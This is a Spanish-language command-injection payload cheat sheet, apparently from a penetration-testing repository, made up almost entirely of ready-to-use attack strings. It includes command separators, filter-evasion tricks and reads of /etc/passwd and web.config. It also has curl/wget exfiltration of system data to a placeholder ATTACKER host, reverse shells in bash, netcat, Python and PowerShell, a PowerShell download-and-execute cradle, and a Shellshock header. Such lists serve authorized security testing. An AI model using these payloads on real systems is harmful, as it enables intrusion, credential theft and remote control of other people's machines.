# 💻 Payloads de inyección de comandos

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Command-Injection.tr.md) • [🇬🇷 Ελληνικά](Command-Injection.el.md)

```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

---

## 🎯 Separadores de comandos

> **Contexto:** los separadores dependen del intérprete; `;` no separa comandos en `cmd.exe` como en PowerShell. Las secuencias `\n` y `%0a` solo actúan como saltos de línea si alguna capa las convierte. Los ejemplos de exfiltración requieren que el contexto admita sus caracteres y codificaciones.

### Linux/Unix
```bash
;       # Punto y coma: ejecutar después
|       # Tubería: enviar la salida al siguiente comando
||      # OR: ejecutar si falla el primero
&       # Ejecutar en segundo plano
&&      # AND: ejecutar si tiene éxito el primero
`cmd`   # Acentos graves: sustitución de comandos
$(cmd)  # Dólar: sustitución de comandos
\n      # Salto de línea: separar comandos
```

### Windows
```cmd
;       # Funciona en algunos casos
|       # Tubería
||      # OR
&       # Ejecutar ambos
&&      # AND
\n      # Salto de línea
%0a     # Salto de línea codificado como URL
```

---

## 💉 Payloads básicos

### Prueba sencilla
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

### Codificado como URL
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # newline + id
```

---

## 🔥 Inyección ciega de comandos

### Detección basada en tiempo
```bash
# Comandos de espera
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

### Detección basada en DNS
```bash
# Usar nslookup
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# Usar curl/wget
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://ATTACKER/?data=$(whoami))
```

### Exfiltración mediante HTTP
```bash
; curl http://ATTACKER/$(whoami)
; curl http://ATTACKER/?d=$(cat /etc/passwd | base64)
; wget http://ATTACKER/$(hostname)
$(curl http://ATTACKER/?id=$(id))
`curl http://ATTACKER/?user=$(whoami)`
```

---

## 🛡️ Técnicas de evasión de filtros

### Evasión de filtros de espacios
```bash
# Usar $IFS (Internal Field Separator: separador interno de campos)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# Usar tabulaciones
;cat	/etc/passwd

# Usar llaves
{cat,/etc/passwd}
```

### Evasión de filtros de palabras clave
```bash
# Dividir comandos
w'h'oami
w"h"oami
who$@ami
who\ami

# Usar comodines
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# Usar variables
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# Codificación hexadecimal
echo -e "\x69\x64" | sh    # id
```

### Evasión de filtros de caracteres especiales
```bash
# Usar delimitadores diferentes
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# Inyección de saltos de línea
%0aid
%0Acat%20/etc/passwd

# Usar comentarios
; id #
| id #
```

---

## 🐧 Payloads para Linux

### Lectura de archivos
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

### Ejecución de comandos
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

### Shell inversa
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/sh ATTACKER 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

## 🪟 Payloads para Windows

### Comandos básicos
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

### Lectura de archivos
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

### Shell inversa
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 📝 Puntos de inyección habituales

```
Parámetros de URL:
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

Parámetros POST:
  filename=test.txt;id
  host=localhost|whoami

Cabeceras:
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

Nombres de archivos subidos:
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

## 📋 Lista de comprobación de pruebas

```markdown
□ Probar todos los separadores de comandos (; | || & && ` $())
□ Probar versiones codificadas como URL
□ Probar inyección ciega basada en tiempo
□ Probar exfiltración DNS/HTTP
□ Probar la evasión de filtros de espacios ($IFS, tabulaciones y llaves)
□ Probar la evasión de palabras clave (comillas y comodines)
□ Probar la inyección de saltos de línea (%0a)
□ Comprobar qué caracteres se filtran
□ Probar comandos tanto de Linux como de Windows
```

---

## 🔗 Payloads relacionados

- [Payloads LFI](./LFI.es.md)
- [Payloads SSTI](./SSTI.es.md)

---

**Volver a los payloads:** [💉 Colección de payloads](../../README.md#-payloads-collection)
